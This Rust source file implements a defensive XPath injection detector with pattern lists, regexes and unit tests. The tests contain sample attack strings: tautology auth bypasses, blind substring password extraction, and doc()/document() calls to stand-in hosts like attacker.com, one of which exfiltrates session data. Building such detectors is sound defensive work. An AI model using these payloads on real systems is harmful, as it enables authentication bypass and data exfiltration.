//! XPath Injection Evaluator — Level 2
//!
//! Detects XPath injection attacks where attacker-controlled input is interpolated
//! into XPath queries. Similar to SQL injection but targeting XML document stores.
//!
//! Impact: authentication bypass, data extraction from XML databases, blind
//! information disclosure via boolean/error-based oracles.

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::types::InvariantClass;
use regex::Regex;
use std::sync::LazyLock;

static XPATH_XPATH2_FUNCTIONS_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(?:matches|replace|tokenize|upper-case|lower-case|string-join|analyze-string|parse-xml|serialize|unparsed-text|environment-variable)\s*\(").unwrap());
static XPATH_DOCUMENT_SSRF_ADVANCED_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)\b(?:fn:)?(?:document|doc)\s*\(\s*(?:concat|substring|substring-before|substring-after|replace|normalize-space|string|\$)[^)]*\)").unwrap());

/// XPath function names that indicate injection attempts.
const XPATH_FUNCTIONS: &[&str] = &[
    "string-length(", "substring(", "concat(", "contains(",
    "normalize-space(", "translate(", "starts-with(",
    "count(", "sum(", "position(", "last(",
    "name(", "local-name(", "namespace-uri(",
    "text()", "comment()", "node()",
    "processing-instruction(",
];

/// XPath axis names (attacker probing XML structure).
const XPATH_AXES: &[&str] = &[
    "child::", "parent::", "ancestor::", "descendant::",
    "following::", "preceding::", "following-sibling::",
    "preceding-sibling::", "self::", "attribute::",
    "namespace::", "ancestor-or-self::", "descendant-or-self::",
];

pub struct XPathEvaluator;

impl L2Evaluator for XPathEvaluator {
    fn id(&self) -> &'static str {
        "xpath"
    }
    fn prefix(&self) -> &'static str {
        "L2 XPath"
    }

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let mut dets = Vec::new();
        let decoded = crate::encoding::multi_layer_decode(input).fully_decoded;
        let lower = decoded.to_ascii_lowercase();

        // 1. XPath tautology — the classic auth bypass
        // ' or '1'='1 or ' or 1=1 or true()
        let tautology_patterns = [
            "' or '1'='1",
            "' or 1=1",
            "\" or \"1\"=\"1",
            "\" or 1=1",
            "' or true()",
            "\" or true()",
            "') or ('1'='1",
            "\") or (\"1\"=\"1",
            "' or ''='",
        ];

        for pattern in &tautology_patterns {
            if lower.contains(pattern) {
                let pos = lower.find(pattern).unwrap_or(0);
                dets.push(L2Detection {
                    detection_type: "xpath_tautology".into(),
                    confidence: 0.92,
                    detail: format!("XPath tautology injection: '{}'", pattern),
                    position: pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::ContextEscape,
                        matched_input: pattern.to_string(),
                        interpretation: "Input contains an XPath tautology pattern that always evaluates to true. When injected into an XPath query like //user[name='INPUT'], it becomes //user[name='' or '1'='1'], returning all nodes and bypassing authentication.".into(),
                        offset: pos,
                        property: "XPath queries must use parameterized expressions. User input must not be interpolated into XPath query strings.".into(),
                    }],
                });
                break;
            }
        }

        // 2. XPath function injection
        for &func in XPATH_FUNCTIONS {
            if lower.contains(func) {
                let pos = lower.find(func).unwrap_or(0);
                dets.push(L2Detection {
                    detection_type: "xpath_function".into(),
                    confidence: 0.83,
                    detail: format!("XPath function detected in input: {}", func),
                    position: pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: decoded[pos..decoded.len().min(pos + 40)].to_string(),
                        interpretation: format!(
                            "Input contains XPath function '{}' which, when injected into an XPath query, enables the attacker to extract data character-by-character (substring), enumerate node counts, or probe XML structure.",
                            func.trim_end_matches('(')
                        ),
                        offset: pos,
                        property: "User input must not contain XPath function syntax. Parameterized XPath queries must be used.".into(),
                    }],
                });
                break;
            }
        }

        // 3. XPath axis injection (navigating XML tree)
        for &axis in XPATH_AXES {
            if lower.contains(axis) {
                let pos = lower.find(axis).unwrap_or(0);
                dets.push(L2Detection {
                    detection_type: "xpath_axis".into(),
                    confidence: 0.80,
                    detail: format!("XPath axis navigation in input: {}", axis),
                    position: pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: decoded[pos..decoded.len().min(pos + 40)].to_string(),
                        interpretation: format!(
                            "Input contains XPath axis '{}' which allows traversing the XML document tree. An attacker can navigate from the current node to parent, ancestor, or sibling nodes, accessing data outside the intended scope.",
                            axis.trim_end_matches("::")
                        ),
                        offset: pos,
                        property: "User input must not contain XPath axis selectors. XPath queries must be constructed server-side with parameterized values.".into(),
                    }],
                });
                break;
            }
        }

        // 4. Blind XPath injection (boolean extraction)
        if (lower.contains("and ") || lower.contains("or ")) &&
            (lower.contains("string-length(") || lower.contains("substring(") || lower.contains("count("))
        {
            dets.push(L2Detection {
                detection_type: "xpath_blind".into(),
                confidence: 0.87,
                detail: "Blind XPath injection pattern — boolean-based data extraction".into(),
                position: 0,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::SemanticEval,
                    matched_input: decoded[..decoded.len().min(100)].to_string(),
                    interpretation: "Input combines boolean operators (and/or) with XPath functions (string-length, substring, count). This pattern is used for blind XPath injection where the attacker extracts data one character at a time by observing true/false responses.".into(),
                    offset: 0,
                    property: "XPath queries must be parameterized. Boolean logic combined with string functions in user input indicates a blind injection attack.".into(),
                }],
            });
        }

        // 5. XPath 2.0/3.0 out-of-band fetch via doc()/document()
        let is_word_char = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
        let oob_candidates = ["fn:document", "document", "fn:doc", "doc"];
        'oob: for candidate in &oob_candidates {
            for (pos, _) in lower.match_indices(candidate) {
                if pos > 0 && is_word_char(lower.as_bytes()[pos - 1]) {
                    continue;
                }

                let mut idx = pos + candidate.len();
                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
                    idx += 1;
                }
                if idx >= lower.len() || lower.as_bytes()[idx] != b'(' {
                    continue;
                }
                idx += 1;
                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
                    idx += 1;
                }
                if idx >= lower.len() || (lower.as_bytes()[idx] != b'\'' && lower.as_bytes()[idx] != b'"') {
                    continue;
                }
                idx += 1;

                let rest = &lower[idx..];
                if rest.starts_with("http://") || rest.starts_with("https://") || rest.starts_with("//") {
                    dets.push(L2Detection {
                        detection_type: "xpath_oob_fetch".into(),
                        confidence: 0.94,
                        detail: format!("XPath out-of-band fetch function detected: {}", candidate),
                        position: pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: decoded[pos..decoded.len().min(pos + 80)].to_string(),
                            interpretation: "Input invokes XPath doc()/document() to fetch remote content over HTTP(S), enabling out-of-band data exfiltration and SSRF-like behavior.".into(),
                            offset: pos,
                            property: "User input must not control XPath document-loading functions (doc/document). External URI resolution in XPath must be disabled or strictly allowlisted.".into(),
                        }],
                    });
                    break 'oob;
                }
            }
        }

        // 6. EXSLT / extension dynamic evaluation functions
        let dynamic_prefixes = ["dyn", "eval", "saxon", "exsl"];
        let dynamic_funcs = ["evaluate", "function", "script"];
        let mut dynamic_hit: Option<(usize, String)> = None;

        'dynamic: for prefix in &dynamic_prefixes {
            for (pos, _) in lower.match_indices(prefix) {
                if pos > 0 && is_word_char(lower.as_bytes()[pos - 1]) {
                    continue;
                }
                let mut idx = pos + prefix.len();
                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
                    idx += 1;
                }
                if idx >= lower.len() || lower.as_bytes()[idx] != b':' {
                    continue;
                }
                idx += 1;
                while idx < lower.len() && lower.as_bytes()[idx].is_ascii_whitespace() {
                    idx += 1;
                }

                for func in &dynamic_funcs {
                    if !lower[idx..].starts_with(func) {
                        continue;
                    }
                    let mut fn_idx = idx + func.len();
                    while fn_idx < lower.len() && lower.as_bytes()[fn_idx].is_ascii_whitespace() {
                        fn_idx += 1;
                    }
                    if fn_idx < lower.len() && lower.as_bytes()[fn_idx] == b'(' {
                        dynamic_hit = Some((pos, format!("{}:{}", prefix, func)));
                        break 'dynamic;
                    }
                }
            }
        }

        if dynamic_hit.is_none() {
            let xpath_like_context = lower.contains("//") || lower.contains("::") || lower.contains('[');
            if xpath_like_context && (lower.contains("eval(") || lower.contains("eval (")) {
                dynamic_hit = lower.find("eval(").or_else(|| lower.find("eval (")).map(|pos| (pos, "eval".into()));
            }
        }

        if let Some((pos, dynamic_name)) = dynamic_hit {
            dets.push(L2Detection {
                detection_type: "xpath_dynamic_eval".into(),
                confidence: 0.92,
                detail: format!("XPath dynamic evaluation detected: {}", dynamic_name),
                position: pos,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: decoded[pos..decoded.len().min(pos + 80)].to_string(),
                    interpretation: "Input uses dynamic XPath evaluation (EXSLT/extension evaluate/function/script), which can execute attacker-controlled XPath expressions and bypass static query constraints.".into(),
                    offset: pos,
                    property: "User input must never flow into dynamic XPath evaluation functions. Disable extension functions or strictly constrain expressions.".into(),
                }],
            });
        }

        if let Some(m) = XPATH_XPATH2_FUNCTIONS_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xpath_xpath2_functions".into(),
                confidence: 0.89,
                detail: "XPath 2.0/3.0 function detected".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "XPath 2.0 introduces matches() for regex matching, document() extensions, and environment-variable() which can read system environment variables. These functions enable blind data extraction and SSRF in systems using XPath 2.0 or 3.0 processors".into(),
                    offset: m.start(),
                    property: "XPath queries must use a sandboxed XPath evaluator with function allowlisting. XPath 2.0/3.0 functions like matches(), environment-variable() must be blocked".into(),
                }],
            });
        }

        if let Some(m) = XPATH_DOCUMENT_SSRF_ADVANCED_RE.find(&decoded) {
            dets.push(L2Detection {
                detection_type: "xpath_document_ssrf_advanced".into(),
                confidence: 0.91,
                detail: "Dynamic document() function call".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "document(concat()) or doc($var) constructs URLs dynamically from XPath expressions, enabling SSRF where the target URL is computed from attacker-controlled XML content rather than a literal string".into(),
                    offset: m.start(),
                    property: "document() and doc() functions must be disabled in XPath processors. If required, allowlist only specific static URLs".into(),
                }],
            });
        }

        dets
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "xpath_tautology" | "xpath_function" | "xpath_axis" | "xpath_blind"
            | "xpath_oob_fetch" | "xpath_dynamic_eval"
            | "xpath_xpath2_functions" | "xpath_document_ssrf_advanced" => {
                Some(InvariantClass::XpathInjection)
            }
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_xpath_tautology() {
        let eval = XPathEvaluator;
        let dets = eval.detect("username=admin' or '1'='1");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_tautology"));
    }

    #[test]
    fn detects_xpath_function() {
        let eval = XPathEvaluator;
        let dets = eval.detect("' and string-length(//user/password)>5");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_function"));
    }

    #[test]
    fn detects_xpath_axis() {
        let eval = XPathEvaluator;
        let dets = eval.detect("' or parent::*/child::password");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_axis"));
    }

    #[test]
    fn detects_blind_xpath() {
        let eval = XPathEvaluator;
        let dets = eval.detect("' and substring(//user/pass,1,1)='a");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_blind"));
    }

    #[test]
    fn test_xpath_oob_doc_fetch() {
        let eval = XPathEvaluator;
        let dets = eval.detect("doc(\"http://attacker.com/steal\")");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_oob_fetch"));
    }

    #[test]
    fn test_xpath_document_function() {
        let eval = XPathEvaluator;
        let dets = eval.detect("document(\"http://evil.com/\")");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_oob_fetch"));
    }

    #[test]
    fn test_xpath_exslt_dynamic_eval() {
        let eval = XPathEvaluator;
        let dets = eval.detect("dyn:evaluate(\"//user/password\")");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_dynamic_eval"));
    }

    #[test]
    fn no_detection_for_normal_input() {
        let eval = XPathEvaluator;
        let dets = eval.detect("username=admin");
        assert!(dets.is_empty());
    }

    #[test]
    fn maps_to_correct_class() {
        let eval = XPathEvaluator;
        assert_eq!(
            eval.map_class("xpath_tautology"),
            Some(InvariantClass::XpathInjection)
        );
    }

    #[test]
    fn detects_xpath_xpath2_functions() {
        let eval = XPathEvaluator;
        let dets = eval.detect("matches(//user/password, '^admin')");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_xpath2_functions"));
    }

    #[test]
    fn detects_xpath_document_ssrf_advanced() {
        let eval = XPathEvaluator;
        let dets = eval.detect("doc(concat('http://attacker.com/', //user/session))");
        assert!(dets.iter().any(|d| d.detection_type == "xpath_document_ssrf_advanced"));
    }
}
